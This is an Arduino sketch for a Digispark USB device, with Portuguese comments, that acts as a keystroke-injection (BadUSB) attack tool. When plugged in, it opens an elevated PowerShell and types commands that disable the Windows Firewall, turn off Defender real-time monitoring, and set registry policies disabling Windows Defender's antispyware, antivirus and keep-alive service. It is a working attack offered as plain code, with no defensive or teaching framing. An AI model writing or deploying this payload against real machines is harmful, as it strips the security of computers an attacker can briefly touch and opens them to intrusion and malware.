#include "DigiKeyboardPtBr.h"
void setup() {
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT); 
}

void loop() {
  pisca_led(100);
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(100);
  // Executa o powershell como administrador
  DigiKeyboardPtBr.println("powershell Start-Process powershell -Verb runAs"); 
  DigiKeyboardPtBr.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardPtBr.delay(200);
  // Desabilita o Firewall do Windows 
  DigiKeyboardPtBr.println("Set-NetFirewallProfile -Enabled False");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);    
  // Desabilita o Windows Defender
  DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring \$true -Force");
  //DigiKeyboardPtBr.println("Set-MpPreference -DisableRealtimeMonitoring \$true -DisableScriptScanning \$true -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -PropertyType DWord -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'ServiceKeepAlive' -Value 0 -PropertyType DWord -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboardPtBr.println("exit");  
  pisca_led(1000);
  for(;;){ /*empty*/ }
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}